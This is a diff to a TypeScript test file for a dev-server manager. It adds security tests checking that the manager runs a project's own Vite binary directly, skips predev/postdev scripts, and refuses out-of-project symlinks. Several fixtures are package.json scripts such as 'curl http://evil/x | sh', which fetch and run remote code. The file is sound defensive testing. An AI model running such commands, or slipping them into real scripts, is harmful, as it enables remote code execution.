@@ -37,6 +37,7 @@ import { spawnDevServerProcess } from '../devServerOutput'
 import { isProcessAlive, STUDIO_DEV_SERVER_STATE_DIR_ENV } from '../devServerRecords'
 import { writeStudioMeta } from '../studioMeta'
 import type { SpawnedProcessLike } from '../subprocessRunner'
+import { writeViteProject } from '../viteLaunch.testHelpers'
 
 /** A fake dev-server process. Like a real one it stays alive until it is killed — or until the test ends it with `exit(code)`, which is how a crash after `ready` is modelled. Its output is not a stream: a real child writes to the log FILE the manager hands every spawn (`live-16`), so `fakeDevServer` writes there too. */
 function makeFakeProcess(): { proc: SpawnedProcessLike; wasKilled: () => boolean; exit: (code: number) => void } {
@@ -67,10 +68,6 @@ function fakeDevServer(stdoutChunks: string[] = []): { spawn: NonNullable<DevSer
   return { ...fake, spawn }
 }
 
-function writePackageJson(dir: string, scripts: Record<string, string>): void {
-  fs.mkdirSync(dir, { recursive: true })
-  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fixture', scripts }))
-}
 
 function makeTmpDir(prefix: string): string {
   return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)))
@@ -133,7 +130,7 @@ afterEach(() => {
 describe('ensureDevServer', () => {
   it('boots the dev server and discovers its printed URL', async () => {
     const tmpDir = makeTmpDir('studio-devserver-boot-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const { spawn } = fakeDevServer(['  VITE v5.0.0  ready\n', '  ➜  Local:   http://localhost:5173/\n'])
 
     const result = await ensureDevServer(tmpDir, { spawn })
@@ -145,7 +142,7 @@ describe('ensureDevServer', () => {
 
   it('strips ANSI escape codes wrapped around the port before matching the URL — confirmed-necessary Vite v8 regression', async () => {
     const tmpDir = makeTmpDir('studio-devserver-ansi-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     // Vite v8 colorizes just the port digits: the ':' and the digits are
     // split by an escape sequence. Without stripping first, URL_PATTERN's
     // `:\d+` never matches.
@@ -160,7 +157,7 @@ describe('ensureDevServer', () => {
 
   it('discovers the same URL when the dev server prints CRLF — a Windows shell wrapper', async () => {
     const tmpDir = makeTmpDir('studio-devserver-crlf-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     // `URL_PATTERN`'s tail is `[^\s"'<>]*` and `\r` IS `\s`, so the `\r` can
     // never be swallowed into the host. Asserted rather than assumed: this is
     // the one subprocess reader under `server/` that matches against raw
@@ -176,7 +173,7 @@ describe('ensureDevServer', () => {
 
   it('returns ok:false with the captured log when the dev server never prints a URL (boot timeout)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-timeout-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const { spawn, wasKilled } = fakeDevServer()
 
     const result = await ensureDevServer(tmpDir, { spawn, bootTimeoutMs: 15 })
@@ -199,7 +196,7 @@ describe('ensureDevServer', () => {
 
     // A plain non-vite script, and a vite invocation with a payload chained after it (sec-21).
     for (const scripts of [{ start: 'node ./server.js' }, { dev: 'vite && curl http://evil/x | sh' }]) {
-      writePackageJson(tmpDir, scripts)
+      writeViteProject(tmpDir, scripts)
       const result = await ensureDevServer(tmpDir, overrides)
       expect(result.ok).toBe(false)
       expect(!result.ok && result.error).toContain('vite')
@@ -213,9 +210,70 @@ describe('ensureDevServer', () => {
     fs.rmSync(tmpDir, { recursive: true, force: true })
   })
 
+  // Security review of #233, F3.4: `<pm> run dev` also runs `predev` and
+  // `postdev`, which the vite-only rule never looked at. Studio runs the
+  // project's own Vite bin, with the script's own arguments, and nothing else.
+  it('runs the project\'s own Vite bin directly — never the package manager, so a repository\'s predev/postdev never runs', async () => {
+    const tmpDir = makeTmpDir('studio-devserver-predev-')
+    writeViteProject(tmpDir, { predev: 'curl http://evil/x | sh', dev: 'vite --port 4000 --host', postdev: 'curl http://evil/y | sh' })
+    let captured: { argv: string[]; env: Record<string, string>; cwd: string } | undefined
+    const result = await ensureDevServer(tmpDir, {
+      spawn: (argv, options) => {
+        captured = { argv, env: options.env, cwd: options.cwd }
+        return fakeDevServer(['Local: http://localhost:5179/\n']).spawn(argv, options)
+      },
+    })
+    expect(result.ok).toBe(true)
+    const [runtime, bin, ...args] = captured!.argv
+    expect(bin).toBe(path.join(tmpDir, 'node_modules', 'vite', 'bin', 'vite.js'))
+    expect(args).toEqual(['--port', '4000', '--host'])
+    expect(path.basename(runtime!).toLowerCase()).not.toMatch(/^(npm|pnpm|yarn)(\.cmd|\.exe)?$/)
+    expect(captured!.argv).not.toContain('run')
+    expect(captured!.argv.join(' ')).not.toContain('curl')
+    // The package manager's `node_modules/.bin` is still on PATH for plugins.
+    expect(captured!.env.PATH?.split(path.delimiter)[0]).toBe(path.join(tmpDir, 'node_modules', '.bin'))
+    stopDevServer(tmpDir)
+    fs.rmSync(tmpDir, { recursive: true, force: true })
+  })
+
+  it('does not boot, and runs nothing, when the project has no Vite installed — never npx-fetches one', async () => {
+    const tmpDir = makeTmpDir('studio-devserver-novite-')
+    writeViteProject(tmpDir, { dev: 'npx vite' })
+    fs.rmSync(path.join(tmpDir, 'node_modules'), { recursive: true, force: true })
+    let spawnCount = 0
+    const result = await ensureDevServer(tmpDir, {
+      spawn: (argv, options) => {
+        spawnCount += 1
+        return fakeDevServer(['Local: http://localhost:5180/\n']).spawn(argv, options)
+      },
+    })
+    expect(result.ok).toBe(false)
+    expect(!result.ok && result.error).toContain('Vite is not installed')
+    expect(spawnCount).toBe(0)
+    fs.rmSync(tmpDir, { recursive: true, force: true })
+  })
+
+  it('refuses a Vite bin that resolves out of the project through a link', async () => {
+    const tmpDir = makeTmpDir('studio-devserver-vitelink-')
+    const outside = makeTmpDir('studio-devserver-vitelink-outside-')
+    writeViteProject(tmpDir, { dev: 'vite' })
+    fs.rmSync(path.join(tmpDir, 'node_modules', 'vite'), { recursive: true, force: true })
+    fs.mkdirSync(path.join(outside, 'bin'), { recursive: true })
+    fs.writeFileSync(path.join(outside, 'package.json'), JSON.stringify({ name: 'vite', bin: 'bin/vite.js' }))
+    fs.writeFileSync(path.join(outside, 'bin', 'vite.js'), '')
+    fs.symlinkSync(outside, path.join(tmpDir, 'node_modules', 'vite'), 'junction')
+    let spawnCount = 0
+    const result = await ensureDevServer(tmpDir, { spawn: (argv, options) => { spawnCount += 1; return fakeDevServer().spawn(argv, options) } })
+    expect(result.ok).toBe(false)
+    expect(spawnCount).toBe(0)
+    fs.rmdirSync(path.join(tmpDir, 'node_modules', 'vite'))
+    fs.rmSync(tmpDir, { recursive: true, force: true })
+    fs.rmSync(outside, { recursive: true, force: true })
+  })
+
   it('returns ok:false with a clear message when package.json has no dev or start script', async () => {
     const tmpDir = makeTmpDir('studio-devserver-noscript-')
-    writePackageJson(tmpDir, { build: 'vite build' })
+    writeViteProject(tmpDir, { build: 'vite build' })
 
     const result = await ensureDevServer(tmpDir, { spawn: fakeDevServer().spawn })
 
@@ -226,7 +284,7 @@ describe('ensureDevServer', () => {
 
   it('spawns the dev server with STUDIO_LIVE_BASE_PATH set to "/p/<projectKey>/" — the base path server/liveOrigin.ts and the generated vite.config.js template agree on (Part B, live-06)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-baseenv-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     let capturedEnv: Record<string, string> | undefined
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -248,7 +306,7 @@ describe('ensureDevServer', () => {
 
   it('injects STUDIO_PROJECT_KEY_ENV, the same projectKey the base-path env var uses (live-08, virtual:studio-runtime)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-projectkey-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     let capturedEnv: Record<string, string> | undefined
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -266,7 +324,7 @@ describe('ensureDevServer', () => {
 
   it('injects STUDIO_PARENT_ORIGINS_ENV as the live frame-ancestor list — PUBLIC_ORIGIN when set, and always the admin and dev origins (live-08, virtual:studio-runtime)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-parentorigin-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const originalPublicOrigin = process.env.PUBLIC_ORIGIN
 
     try {
@@ -306,7 +364,7 @@ describe('ensureDevServer', () => {
   it('computes STUDIO_LIVE_BASE_PATH\'s projectKey from the ORIGINAL project dir, not the narrowed (monorepo) app root — getting this backwards would silently mismatch server/liveOrigin.ts\'s own /p/<projectKey> routing key for every nested project', async () => {
     const tmpDir = makeTmpDir('studio-devserver-monorepo-')
     fs.mkdirSync(path.join(tmpDir, 'apps', 'web'), { recursive: true })
-    writePackageJson(path.join(tmpDir, 'apps', 'web'), { dev: 'vite' })
+    writeViteProject(path.join(tmpDir, 'apps', 'web'), { dev: 'vite' })
     writeNestedAppRootProfile(tmpDir, 'apps/web')
 
     let capturedEnv: Record<string, string> | undefined
@@ -333,7 +391,7 @@ describe('ensureDevServer', () => {
 
   it('reuses the same dev server across calls for the same project (no second spawn)', async () => {
     const tmpDir = makeTmpDir('studio-devserver-reuse-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     let spawnCount = 0
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -363,7 +421,7 @@ describe('getDevServerStatus / startDevServer / stopDevServer', () => {
 
   it('start returns immediately without waiting for boot, then status observes the ready transition', async () => {
     const tmpDir = makeTmpDir('studio-devserver-start-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     let spawnCount = 0
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -387,7 +445,7 @@ describe('getDevServerStatus / startDevServer / stopDevServer', () => {
 
   it('retains a failed boot in the registry so status can show its log, then clears it on the next start', async () => {
     const tmpDir = makeTmpDir('studio-devserver-failed-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     let spawnCount = 0
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -411,7 +469,7 @@ describe('getDevServerStatus / startDevServer / stopDevServer', () => {
 
   it('a dev server that exits AFTER it was ready reports failed with the exit in its log, and the next start respawns', async () => {
     const tmpDir = makeTmpDir('studio-devserver-crash-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const fakes: ReturnType<typeof makeFakeProcess>[] = []
     const overrides: DevServerOverrides = {
       spawn: (argv, options) => {
@@ -440,7 +498,7 @@ describe('getDevServerStatus / startDevServer / stopDevServer', () => {
 
   it('stop kills a running process and resets status to stopped; stopping twice is a no-op', async () => {
     const tmpDir = makeTmpDir('studio-devserver-stop-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const { spawn, wasKilled } = fakeDevServer(['Local: http://localhost:5176/\n'])
 
     startDevServer(tmpDir, { spawn })
@@ -507,7 +565,7 @@ describe('tryServeStudioDevServer', () => {
 
   it('at Tier 2, POST start returns booting and GET status observes ready against a fake dev server', async () => {
     const tmpDir = makeTmpDir('studio-devserver-route-ready-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     writeStudioMeta(tmpDir, { trust: 'run-project' })
 
     const startRes = await call(
@@ -588,7 +646,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('writes a record once ready, and stop removes it', async () => {
     const tmpDir = makeTmpDir('studio-devserver-record-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const { spawn, wasKilled } = fakeDevServer(READY_CHUNKS)
 
     const result = await ensureDevServer(tmpDir, { spawn })
@@ -611,7 +669,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('after a restart, adopts the recorded server instead of spawning a second one', async () => {
     const tmpDir = makeTmpDir('studio-devserver-adopt-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const first = fakeDevServer(READY_CHUNKS)
     expect((await ensureDevServer(tmpDir, { spawn: first.spawn })).ok).toBe(true)
 
@@ -655,7 +713,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('a plain status poll after a restart adopts the recorded server too — the proxy never has to wait for a start call', async () => {
     const tmpDir = makeTmpDir('studio-devserver-poll-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     expect((await ensureDevServer(tmpDir, { spawn: fakeDevServer(READY_CHUNKS).spawn })).ok).toBe(true)
     forgetDevServersForTest()
 
@@ -669,7 +727,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('a status poll adopts a recorded server whose pid is alive — it is this process\'s own pid here', async () => {
     const tmpDir = makeTmpDir('studio-devserver-poll-live-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     const alive = fakeDevServer(READY_CHUNKS)
     // The fake process reports pid 4242; rewrite the record to a pid that IS alive so the default check passes.
     expect((await ensureDevServer(tmpDir, { spawn: alive.spawn })).ok).toBe(true)
@@ -692,7 +750,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('a record whose pid is gone is discarded and a fresh server is spawned', async () => {
     const tmpDir = makeTmpDir('studio-devserver-dead-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     expect((await ensureDevServer(tmpDir, { spawn: fakeDevServer(READY_CHUNKS).spawn })).ok).toBe(true)
     forgetDevServersForTest()
 
@@ -716,7 +774,7 @@ describe('dev-server records — adoption across a server restart', () => {
 
   it('a record whose origin no longer answers is discarded and a fresh server is spawned in the same start', async () => {
     const tmpDir = makeTmpDir('studio-devserver-stale-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     expect((await ensureDevServer(tmpDir, { spawn: fakeDevServer(READY_CHUNKS).spawn })).ok).toBe(true)
     forgetDevServersForTest()
 
@@ -756,7 +814,7 @@ describe('dev-server records — adoption across a server restart', () => {
     expect(isProcessAlive(-1)).toBe(false)
     expect(isProcessAlive(process.pid)).toBe(true)
     const tmpDir = makeTmpDir('studio-devserver-pid0-')
-    writePackageJson(tmpDir, { dev: 'vite' })
+    writeViteProject(tmpDir, { dev: 'vite' })
     expect((await ensureDevServer(tmpDir, { spawn: fakeDevServer(READY_CHUNKS).spawn })).ok).toBe(true)
     const file = path.join(stateDir, recordFiles()[0]!)
     const record = JSON.parse(fs.readFileSync(file, 'utf8')) as Record<string, unknown>
